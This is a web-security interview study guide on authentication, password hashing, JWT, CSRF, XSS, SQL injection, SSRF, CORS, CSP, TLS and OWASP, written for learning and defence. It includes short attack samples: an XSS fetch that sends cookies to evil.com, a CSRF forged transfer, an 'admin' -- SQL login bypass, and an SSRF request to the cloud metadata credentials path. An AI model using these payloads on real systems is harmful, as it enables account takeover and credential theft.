## 1. CIA Triad

The three foundational goals of information security (commonly asked to name and define):

- **Confidentiality**: preventing unauthorized access/disclosure of data (e.g., encryption, access controls).
- **Integrity**: ensuring data isn't tampered with/altered without authorization (e.g., checksums, digital signatures, hashing).
- **Availability**: ensuring systems/data remain accessible to authorized users when needed (e.g., redundancy, DDoS protection, failover — ties to the Networking guide's load balancing/CDN sections).

**Interview trap:** Most security discussions map cleanly onto one (or more) of these three pillars — a strong habit is to frame any vulnerability/attack explicitly in CIA terms (e.g., "SQL injection primarily threatens confidentiality and integrity — an attacker can read *or* modify data they shouldn't be able to").

## 2. Authentication

Verifying **who** a user/system is ("proving identity") — answers "who are you?"

**Common authentication factors (know the categories — commonly asked):**
- **Something you know**: password, PIN.
- **Something you have**: phone (SMS/OTP), hardware token, authenticator app.
- **Something you are**: biometrics (fingerprint, face ID).

**Multi-Factor Authentication (MFA/2FA):** Requires two or more of the above factor categories — significantly harder to compromise than a single factor, since an attacker would need to defeat multiple independent factors (e.g., knowing a stolen password alone isn't enough without also having the victim's phone for an OTP).

**Common authentication mechanisms (ties directly to the APIs & HTTP guide — Sections 9-11 there):**
- **Session-based**: server-side session + cookie (stateful).
- **Token-based (JWT)**: self-contained, signed token (stateless).
- **OAuth2/OIDC**: delegated authentication/authorization via a trusted third party (e.g., "Login with Google").

## 3. Authorization

Verifying **what** an authenticated user/system is **allowed to do** — answers "what can you access?" Always happens *after* authentication (you must know who someone is before deciding what they can do).

**Authentication vs Authorization (the classic distinction — ties directly to the 401 vs 403 status code distinction from the APIs guide):** Authentication = identity verification (401 = failure here). Authorization = permission verification (403 = failure here, once identity is already known).

**Common authorization models (commonly asked to compare):**
- **RBAC (Role-Based Access Control)**: permissions are assigned to **roles** (e.g., "admin," "editor," "viewer"), and users are assigned to roles — simple to manage at scale, but can become rigid/coarse-grained if real-world permission needs don't map cleanly onto discrete roles.
- **ABAC (Attribute-Based Access Control)**: access decisions are based on **attributes** of the user, resource, and environment (e.g., "allow if user.department == resource.department AND time is within business hours") — much more flexible/fine-grained than RBAC, but more complex to implement and reason about.
- **ACL (Access Control List)**: a list attached directly to a resource, specifying which users/groups have which permissions on it (e.g., a file's permission list) — fine-grained per-resource, but can become unwieldy to manage at scale across many resources.

**Principle of Least Privilege:** Users/systems should be granted only the **minimum** permissions necessary to perform their function — a foundational security design principle, worth citing whenever discussing authorization design, since it directly limits the "blast radius" of any single compromised account or component.

## 4. Password Hashing

**Never store plaintext passwords.** Instead, store a **hash** of the password, so that even if the database is breached, the actual passwords aren't directly exposed.

**Why plain hashing (e.g., raw SHA-256) isn't enough (a very commonly asked follow-up):**
- **Rainbow table attacks**: precomputed tables mapping common passwords to their hash values allow instant reversal of unsalted hashes for common/weak passwords.
- **Speed is a liability here**: general-purpose hash functions like SHA-256 are designed to be **fast** (good for data integrity checks) — but that same speed lets an attacker with a stolen hash database try billions of guesses per second on modern hardware (especially GPUs), making brute-forcing feasible.

**The fix — Salting:** A unique, random value (**salt**) is generated per user and combined with the password before hashing, then stored alongside the hash. This defeats rainbow tables (precomputed for unsalted hashes) since every user's hash is unique even for identical passwords, and forces an attacker to brute-force each password individually rather than reusing a single precomputed table across all users.

**The better fix — Purpose-built slow hashing algorithms:** Modern password storage uses algorithms **specifically designed to be slow and computationally/memory expensive**, making brute-forcing impractical even with powerful hardware:
- **bcrypt**: incorporates salting automatically, and has a configurable "cost factor" (work factor) that can be tuned upward over time as hardware gets faster.
- **scrypt**: additionally designed to be **memory-hard** (requires significant RAM, not just CPU time), specifically to resist attacks using specialized hardware (ASICs/GPUs) that have abundant compute but not necessarily abundant fast memory.
- **Argon2**: the modern recommended standard (winner of the Password Hashing Competition), configurable for both memory-hardness and compute cost, considered the current best practice.

**Interview trap:** *"Why not just use SHA-256 with a salt — isn't that enough?"* Salting solves the rainbow-table problem, but SHA-256 is still **fast**, so an attacker can still brute-force a stolen salted-SHA-256 hash database at high speed (just no longer able to reuse work across users). Purpose-built algorithms like bcrypt/Argon2 are deliberately **slow**, making even per-hash brute-forcing computationally expensive at scale — this speed-vs-security trade-off is the key insight interviewers are checking for.

## 5. JWT Security

*(JWT structure/mechanics covered in depth in the APIs & HTTP guide, Section 10 — this section focuses specifically on the security pitfalls.)*

**Key JWT security concerns (commonly probed):**
- **Never store sensitive data in the payload** — it's Base64-encoded, not encrypted; anyone who obtains the token can decode and read the claims.
- **`alg: none` vulnerability**: historically, some JWT libraries accepted tokens with `alg` set to `none`, allowing an attacker to forge an unsigned but "valid-looking" token — always explicitly whitelist the expected signing algorithm(s) when verifying, never trust the algorithm specified in the token's own header.
- **Algorithm confusion attacks**: if a server accepts both symmetric (HS256) and asymmetric (RS256) algorithms, an attacker who knows the RS256 **public** key (often publicly available by design) can craft a token signed with HS256, using the public key as the HMAC secret — since the server might naively use "whatever algorithm the token claims" combined with "a key it has on hand" to verify. Mitigation: pin the expected algorithm server-side, don't derive it from the token itself.
- **No built-in revocation**: since JWTs are stateless and self-contained, there's no native way to invalidate a specific token before its `exp` — mitigated with short-lived access tokens + a refresh-token pattern (revocable, tracked server-side), or a server-side blocklist for critical cases (sacrificing some statelessness for security).
- **Storage location trade-off**: `localStorage` is readable by any JavaScript on the page (vulnerable to XSS-based token theft, Section 7); an `HttpOnly` cookie is inaccessible to JavaScript (mitigating XSS theft) but reintroduces CSRF exposure (Section 6) unless paired with `SameSite` cookie attributes.

## 6. CSRF

**CSRF (Cross-Site Request Forgery)**: Tricks an authenticated user's browser into unknowingly sending a malicious request to a site they're logged into, exploiting the fact that browsers automatically attach cookies (including session cookies) to requests, regardless of which site initiated the request.

```html
<!-- Hosted on evil.com, visited by a user who's currently logged into bank.com -->
<img src="https://bank.com/transfer?amount=1000&to=attacker" />
<!-- Browser automatically sends bank.com's session cookie along with this "innocent" image request -->
```
If `bank.com` doesn't verify the request actually originated from its own site, it processes the transfer as if the legitimate logged-in user requested it — because, from the server's cookie-based perspective, it looks legitimate (valid session cookie attached).

**Mitigations (commonly asked to list):**
- **CSRF tokens (Synchronizer Token Pattern)**: server generates a unique, unpredictable token embedded in forms/requests; the server rejects any state-changing request that doesn't include a valid matching token — since the attacker's page (on a different origin) can't read/know this token (same-origin policy prevents it from fetching and reading the legitimate page's content).
- **`SameSite` cookie attribute** (covered in the APIs guide, Section 8): `SameSite=Strict` or `Lax` prevents the browser from sending the cookie on cross-site requests in the first place, directly neutralizing the attack vector at the browser level — modern browsers default to `Lax`, which has significantly reduced CSRF's real-world prevalence.
- **Checking the `Origin`/`Referer` header**: server-side validation that a state-changing request actually originated from its own domain.
- Using state-changing operations only via methods less susceptible to naive forgery (though this is a weaker mitigation on its own) and requiring re-authentication for especially sensitive actions.

## 7. XSS

**XSS (Cross-Site Scripting)**: Injecting malicious JavaScript into a web page that's then executed in **other users'** browsers, typically because user-supplied input is rendered into the page without proper sanitization/escaping.

**Three types (commonly asked to distinguish):**
- **Stored (Persistent) XSS**: malicious script is saved on the server (e.g., in a comment/post field) and served to every user who views that content — the most dangerous variant, since it affects all viewers automatically without them needing to click anything special.
- **Reflected XSS**: malicious script is embedded in a request (e.g., a URL query parameter) and immediately reflected back in the response without sanitization — requires tricking a victim into clicking a crafted malicious link.
- **DOM-based XSS**: the vulnerability exists entirely in client-side JavaScript that unsafely writes attacker-controlled data into the DOM (e.g., `element.innerHTML = location.hash`), without the malicious payload ever necessarily touching the server at all.

```html
<!-- Vulnerable: user's comment "<script>fetch('evil.com?cookie='+document.cookie)</script>" rendered directly -->
<div>User comment: <script>fetch('evil.com?cookie='+document.cookie)</script></div>
```

**Mitigations (commonly asked to list):**
- **Output encoding/escaping**: always escape user-supplied data before rendering it into HTML (convert `<`, `>`, `&`, `"` to their HTML entity equivalents) — most modern frameworks (React, Vue, Angular) do this **automatically by default** for standard text rendering, a major reason "escaping by default" template engines are strongly preferred over manual string concatenation into HTML.
- **`HttpOnly` cookies**: prevents JavaScript (including injected XSS payloads) from reading sensitive cookies like session tokens, limiting the damage even if XSS occurs.
- **Content Security Policy (CSP)** (Section 11): restricts which sources scripts can be loaded/executed from, blocking many XSS payloads even if injection occurs.
- **Input validation/sanitization**: particularly important for any field that legitimately needs to accept some HTML (e.g., a rich-text editor) — use a well-vetted sanitization library rather than attempting to write custom filtering logic (a very common source of bypassable, incomplete home-grown sanitizers).

**Interview trap:** *"Doesn't input validation alone prevent XSS?"* Not reliably — the more robust and defense-in-depth-aligned practice is **output encoding at render time** (escaping data based on the specific context it's being rendered into — HTML body, HTML attribute, JavaScript string, URL, etc., each having different escaping rules), since input validation alone can miss encoding edge cases, and data might be rendered in multiple different contexts throughout an application.

## 8. SQL Injection

Exploiting improperly sanitized user input that's concatenated directly into a SQL query, allowing an attacker to alter the query's logic/structure.

```python
# VULNERABLE — user input concatenated directly into the query string
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
# If username = "admin' -- ", the query becomes:
# SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'
# The "--" comments out the password check entirely, logging in as admin without knowing the password
```

**The fix — Parameterized Queries / Prepared Statements (the single most important mitigation, always mention this first):**
```python
# SAFE — parameters are sent SEPARATELY from the query structure, never interpreted as SQL syntax
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```
The database driver sends the query **structure** and the **parameter values** as distinct entities to the database engine — the parameter values are never parsed as part of the SQL syntax itself, no matter what characters they contain, structurally eliminating the injection vector (not just filtering "dangerous" characters, which is inherently incomplete/bypassable).

**Additional mitigations (secondary/defense-in-depth, worth mentioning after parameterized queries):**
- **ORM usage**: most ORMs (SQLAlchemy, Hibernate, ActiveRecord) use parameterized queries under the hood by default, reducing the chance of accidentally writing raw, vulnerable SQL string concatenation.
- **Principle of least privilege**: the database user/connection used by the application should have only the minimum permissions it actually needs (e.g., a read-only reporting service shouldn't have `DROP TABLE` permissions) — limits the damage even if an injection somehow occurs.
- **Input validation**: as a secondary layer, not a replacement for parameterization (e.g., validating that an "age" field is actually numeric).
- **Least-privilege + WAF (Web Application Firewall)**: can catch/block obvious injection payload patterns as an additional layer, though this is not a substitute for fixing the underlying query construction.

**Interview trap:** *"Isn't escaping special characters (like `'`) enough to prevent SQL injection?"* It can help but is fragile and error-prone — different contexts/DB engines have different escaping rules, and it's easy to miss an edge case (encoding tricks, numeric contexts that don't need quotes at all, etc.). Parameterized queries are structurally safe because they separate code from data entirely, rather than relying on correctly sanitizing every possible dangerous character in every context.

## 9. SSRF

**SSRF (Server-Side Request Forgery)**: Tricking a server into making an HTTP (or other) request to an unintended destination — often used to reach **internal**, otherwise-unreachable resources (internal admin panels, cloud metadata endpoints, internal-only services) by abusing a server-side feature that fetches a URL on the attacker's behalf.

```
Vulnerable feature: "Enter an image URL to set as your profile picture" → server fetches whatever URL is given

Attacker submits: http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Server (running in a cloud environment) unknowingly fetches the CLOUD PROVIDER'S INTERNAL METADATA ENDPOINT
→ Response (containing sensitive cloud credentials) is returned to the attacker via the app's response
```
The `169.254.169.254` cloud metadata endpoint (used by AWS/GCP/Azure to provide instance credentials/config to the VM itself) is a **classic, extremely commonly cited real-world SSRF target**, since a successful SSRF against it can leak cloud IAM credentials, leading to full account/infrastructure compromise — worth knowing this specific example, as it comes up frequently in security interview discussions.

**Mitigations (commonly asked to list):**
- **Allowlist validation**: only permit requests to explicitly known-safe domains/IPs, rather than trying to blocklist "known bad" destinations (blocklists are inherently incomplete and bypassable, e.g., via DNS rebinding, redirects, or alternate IP representations).
- **Block requests to internal/private IP ranges** (e.g., `169.254.169.254`, `10.0.0.0/8`, `192.168.0.0/16`, `127.0.0.1`) from any server-side URL-fetching feature.
- **Disable unnecessary URL schemes**: restrict fetches to `http`/`https` only, blocking `file://`, `gopher://`, etc., which can be abused for different classes of attacks.
- **Network-level segmentation**: even if application-level validation is somehow bypassed, network policies (firewall rules) should prevent the application server from reaching sensitive internal services it has no legitimate need to reach.

## 10. CORS

*(Covered from the API/browser mechanics angle in the APIs & HTTP guide, Section 7 — here framed specifically as a security control.)*

**CORS (Cross-Origin Resource Sharing)** is fundamentally a **relaxation** mechanism for the browser's default **Same-Origin Policy** (which otherwise blocks JavaScript on one origin from reading responses from a different origin) — it lets a server explicitly opt certain other origins **in** to being allowed to read its responses via JavaScript.

**Common misconception (frequently tested):** CORS is **not** a server-side security mechanism protecting the server itself — it's enforced by the **browser**, protecting the **user**, by controlling which cross-origin responses a webpage's JavaScript is allowed to read. A non-browser client (e.g., `curl`, a backend service, Postman) can freely make cross-origin requests and read the responses regardless of CORS headers — CORS only constrains browser-based JavaScript.

**Security misconfiguration to watch for (commonly probed):** Setting `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` is actually **disallowed by browsers themselves** (a wildcard origin cannot be combined with credentialed requests) precisely because it would defeat the purpose entirely — but naively reflecting **any** requesting origin back in the `Access-Control-Allow-Origin` header (dynamically setting it to whatever `Origin` the request came from, without validating against an actual allowlist) achieves the same dangerous effect while technically satisfying that browser restriction, and is a common real-world misconfiguration worth being able to identify.

## 11. CSP (Content Security Policy)

An HTTP response header that lets a server declare **which sources** of content (scripts, styles, images, fonts, frames, etc.) a browser is allowed to load/execute for that page — a powerful defense-in-depth layer specifically effective against XSS (Section 7), among other injection attacks.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';
```
- `default-src 'self'` — by default, only load resources from the same origin.
- `script-src 'self' https://trusted-cdn.com` — scripts only from same origin or this specific trusted CDN.
- `object-src 'none'` — disallow `<object>`/`<embed>` entirely (common vector for older plugin-based attacks).

**Why CSP matters even alongside proper output encoding (Section 7):** It's a **defense-in-depth** measure — even if an XSS payload somehow gets injected despite escaping efforts (e.g., a bug in a templating library, a missed edge case), a strict CSP can still **prevent the injected script from executing** at all (e.g., by disallowing inline scripts via omitting `'unsafe-inline'` from `script-src`, forcing all scripts to come from allowlisted external sources) — providing a second independent layer of protection rather than relying on a single point of failure.

**`nonce`/`hash`-based CSP:** For sites that need some inline scripts, a per-request random `nonce` (or a hash of the exact script content) can be included in both the CSP header and the specific `<script>` tag, allowing that specific script while still blocking any other (attacker-injected) inline script that doesn't have the matching nonce — a more modern, more compatible alternative to disallowing all inline scripts outright.

## 12. TLS

*(TLS handshake mechanics covered in depth in the APIs & HTTP guide, Section 12 — here summarized in security-specific framing.)*

TLS provides the **confidentiality**, **integrity**, and **(server) authentication** legs of the CIA triad for data in transit — without it, any intermediary on the network path (a compromised router, a malicious Wi-Fi hotspot, an ISP) could read or tamper with data in plaintext (a **man-in-the-middle attack**).

**Certificate validation is what prevents MITM attacks specifically:** The browser/client verifies the server's certificate is signed by a trusted Certificate Authority, confirming it's actually talking to the legitimate server and not an imposter intercepting the connection — this is why certificate warnings should never be casually dismissed/ignored, and why **certificate pinning** (hardcoding the expected certificate/public key in a mobile app, rather than trusting any CA-signed cert) is sometimes used in high-security mobile applications to guard against compromised or coerced CAs.

**HSTS (HTTP Strict Transport Security):** A response header (`Strict-Transport-Security: max-age=31536000; includeSubDomains`) instructing browsers to **only** ever connect to this domain via HTTPS for the specified duration, even if a user types `http://` or clicks an `http://` link — protects against **SSL stripping** attacks, where an attacker on the network path intercepts and downgrades an initial plaintext HTTP request before a redirect to HTTPS can occur.

## 13. Encryption

The process of transforming data (**plaintext**) into an unreadable form (**ciphertext**) using an algorithm and a key, reversible only by someone possessing the correct decryption key.

**Encryption in transit vs. at rest (commonly asked distinction):**
- **In transit**: protecting data as it moves across a network (e.g., TLS, Section 12).
- **At rest**: protecting data stored on disk (e.g., encrypted database columns, full-disk encryption, encrypted S3 buckets) — protects against scenarios where storage media itself is stolen/accessed directly, bypassing network-level protections entirely.

**Hashing vs Encryption (a very commonly confused/tested distinction):**
| | Hashing | Encryption |
|---|---|---|
| Reversible? | **No** — one-way function, by design | **Yes** — reversible with the correct key |
| Purpose | Integrity verification, password storage (Section 4) | Confidentiality — allowing authorized parties to recover the original data |
| Output size | Fixed size, regardless of input length | Typically proportional to input length |

**Interview trap:** *"Why not just encrypt passwords instead of hashing them?"* Because encryption is reversible (by design) — if the encryption key were ever compromised (or the encrypting service needed to be compromised through any means), all passwords could be recovered in plaintext. Hashing (with salting and a slow algorithm) is deliberately **one-way** — even the service itself cannot recover the original password, only verify a given input hashes to the same stored value, which is the correct security property for password storage (the service never needs to know the actual password, only whether a login attempt's password is correct).

## 14. Symmetric vs Asymmetric

*(The core cryptographic building blocks underlying TLS, JWT signing, and general encryption — commonly asked to compare directly.)*

**Symmetric Encryption:** The **same key** is used for both encryption and decryption.
- **Examples**: AES, ChaCha20.
- **Pros**: Fast, computationally efficient — suitable for encrypting large volumes of data.
- **Cons**: **Key distribution problem** — both parties need the same secret key, and securely sharing that key in the first place (especially over an untrusted channel) is itself a hard problem.

**Asymmetric Encryption (Public-Key Cryptography):** Uses a **key pair** — a **public key** (freely shareable) and a **private key** (kept secret) — data encrypted with the public key can only be decrypted with the corresponding private key (and vice versa, for digital signatures).
- **Examples**: RSA, ECC (Elliptic Curve Cryptography), Diffie-Hellman (technically a key-exchange protocol, not encryption itself, but built on the same asymmetric key-pair concept).
- **Pros**: Solves the key-distribution problem — the public key can be shared openly without compromising security; also enables **digital signatures** (proving a message came from the holder of a specific private key, and wasn't tampered with).
- **Cons**: Computationally **much more expensive** than symmetric encryption — significantly slower for large amounts of data.

**Why TLS (and most real-world systems) use BOTH together (directly ties back to the Networking guide's TLS handshake explanation):** Asymmetric encryption is used briefly during the handshake to securely establish a shared secret (solving the key-distribution problem, without needing the two parties to have ever met/exchanged a secret beforehand) — then the actual bulk data transfer switches to fast **symmetric** encryption using that now-shared secret key. This "hybrid" approach captures the security benefit of asymmetric key exchange with the performance benefit of symmetric encryption for the bulk of the work.

**Digital Signatures (worth understanding the mechanics, commonly asked):** The sender hashes the message, then encrypts that hash with their **private** key (the "signature") — anyone with the sender's **public** key can decrypt the signature to recover the hash, independently hash the received message themselves, and compare the two: a match proves both that the message came from the claimed sender (only they have the private key) **and** that it wasn't tampered with in transit (integrity) — this is the exact mechanism underlying JWT's RS256 signing (Section 5 / APIs guide Section 10).

## 15. OWASP Top 10

The Open Web Application Security Project's periodically updated list of the most critical web application security risks — a widely referenced industry-standard checklist, frequently the subject of a direct "name a few of these and explain one" interview question.

**Representative categories (2021 edition naming, worth knowing by concept even if exact wording shifts between revisions):**
1. **Broken Access Control**: authorization failures — users able to act outside their intended permissions (e.g., accessing another user's data by simply changing an ID in a URL, a specific pattern called **IDOR — Insecure Direct Object Reference**).
2. **Cryptographic Failures**: sensitive data exposed due to missing/weak encryption (e.g., plaintext password storage, weak/outdated algorithms).
3. **Injection**: SQL injection (Section 8), and its siblings (NoSQL injection, command injection, LDAP injection) — any case where untrusted input is interpreted as code/commands rather than pure data.
4. **Insecure Design**: security flaws baked into the architecture/design itself, not just implementation bugs — a broader, higher-level category emphasizing that some vulnerabilities can't be "patched," they require rethinking the design.
5. **Security Misconfiguration**: default credentials left unchanged, unnecessary features/ports left enabled, overly permissive cloud storage settings (e.g., a publicly readable S3 bucket containing sensitive data — an extremely common real-world breach cause).
6. **Vulnerable and Outdated Components**: using libraries/frameworks/dependencies with known, publicly disclosed vulnerabilities — underscores the importance of dependency scanning and timely patching.
7. **Identification and Authentication Failures**: weak password policies, missing MFA, session fixation, predictable session tokens.
8. **Software and Data Integrity Failures**: trusting unverified sources for code/updates/CI-CD pipelines (e.g., installing a compromised third-party package — a growing supply-chain-attack concern).
9. **Security Logging and Monitoring Failures**: insufficient logging/alerting means breaches go undetected for long periods, delaying response and increasing damage.
10. **SSRF** (Section 9): specifically called out as its own category due to its growing prevalence, especially in cloud-native environments (the metadata-endpoint attack pattern discussed above).

**Interview framing tip:** You don't need to recite the list verbatim (exact wording/ranking changes between OWASP revisions) — what's valued is being able to **explain a couple of these in depth with a concrete example and mitigation**, and to recognize that most of the sections in this guide (SQLi, XSS, CSRF, SSRF, broken auth) map directly onto specific OWASP Top 10 categories.

## 16. Secrets Management

Practices for securely storing and accessing sensitive credentials (API keys, database passwords, encryption keys, certificates) used by applications.

**Anti-patterns to explicitly call out (commonly asked "what NOT to do"):**
- **Hardcoding secrets in source code**: even if the repository is "private," secrets end up in version control history permanently (recoverable even after later deletion/removal from the current file state), and can leak via accidental public repo pushes, screen shares, or CI logs.
- **Committing `.env` files** to version control (a very common real-world mistake).
- **Storing secrets in plaintext config files** on production servers without any access restriction/encryption.

**Best practices (commonly asked to list):**
- **Dedicated secrets management tools**: HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager — centralize storage, provide fine-grained access control, and support automatic **rotation** of credentials.
- **Environment variables** (injected at runtime, not committed to source control) as a baseline minimum, though dedicated secret managers are preferred for production-grade systems since environment variables can still be inadvertently exposed (e.g., via debugging endpoints, process listings, crash dumps).
- **Principle of least privilege**: each service/application should only have access to the specific secrets it actually needs, not a shared pool of all credentials.
- **Secret rotation**: periodically changing credentials (and automating this process) limits the window of exposure if a secret is ever compromised without anyone's immediate knowledge.
- **Audit logging**: tracking who/what accessed which secrets and when, to support incident investigation if a compromise is suspected.

## 17. Rapid-Fire Interview Q&A

**Q: What's the fundamental difference between authentication and authorization?**
Authentication verifies identity ("who are you" — 401 on failure); authorization verifies permissions ("what can you do" — 403 on failure), and always happens after authentication.

**Q: Why is salting alone not enough for password storage — you also need a slow algorithm?**
Salting defeats rainbow tables (precomputed hash tables), but a fast hash function (like plain SHA-256) still allows rapid brute-forcing of each individual salted hash; purpose-built slow algorithms (bcrypt/scrypt/Argon2) make brute-forcing computationally impractical even per-hash.

**Q: What's the single most effective defense against SQL injection?**
Parameterized queries/prepared statements — they structurally separate query code from data, so user input is never interpreted as SQL syntax, regardless of its content.

**Q: How does a CSRF token actually prevent the attack?**
The attacker's page (on a different origin) cannot read the legitimate site's CSRF token (protected by the same-origin policy), so it can't include a valid token in its forged request — the server rejects any state-changing request missing a valid, matching token.

**Q: Is CORS a server-side security mechanism?**
No — it's enforced by browsers to protect users, controlling which cross-origin responses JavaScript can read. It doesn't restrict non-browser clients (curl, backend services) from making the same requests and reading the same responses.

**Q: Why do we hash passwords instead of encrypting them?**
Hashing is one-way (irreversible) — even the service itself can't recover the original password, only verify a match, which is the correct property since the service never actually needs to know the real password, only whether a login attempt is correct.

**Q: What's the classic real-world target for an SSRF attack in cloud environments?**
The cloud provider's instance metadata endpoint (e.g., AWS's `169.254.169.254`), which can leak sensitive IAM credentials if a server can be tricked into fetching it on an attacker's behalf.

**Q: Symmetric vs asymmetric encryption — why does TLS use both?**
Asymmetric encryption solves the key-distribution problem (secure key exchange without a pre-shared secret) but is computationally expensive; symmetric encryption is fast but requires a pre-shared key. TLS uses asymmetric crypto briefly during the handshake to establish a shared secret, then switches to fast symmetric encryption for the actual data transfer.

**Q: What's the difference between stored, reflected, and DOM-based XSS?**
Stored: malicious script persisted server-side, served to all viewers. Reflected: script embedded in a request, immediately reflected back (requires a crafted link/click). DOM-based: vulnerability exists purely in client-side JS unsafely writing attacker-controlled data into the DOM, without necessarily involving the server at all.

## Suggested Study Approach
1. Be able to explain, from memory, the mitigation for each of SQLi, XSS, and CSRF with a concrete before/after code example — these three are the most consistently asked security questions across interviews.
2. Practice framing any given vulnerability explicitly in terms of the CIA triad and, where applicable, its corresponding OWASP Top 10 category — this signals structured security thinking rather than rote memorization.
3. Be ready to explain the password-hashing story end-to-end: why plaintext is bad → why unsalted hashing is bad → why fast salted hashing is still bad → why bcrypt/Argon2 solve it — interviewers often build this up incrementally as a series of "but what about..." follow-ups.
4. Pair this section with the APIs & HTTP guide (JWT, OAuth2, cookies, CORS, TLS) and the Networking guide (TLS handshake, VPNs, firewalls) — security questions very often get asked as follow-ups embedded within API-design or system-design discussions, not as an isolated topic.
5. Review real-world breach case studies briefly (e.g., misconfigured S3 buckets, SSRF-via-metadata-endpoint incidents) — being able to cite a concrete, well-known example strengthens answers considerably in senior-leaning interviews.
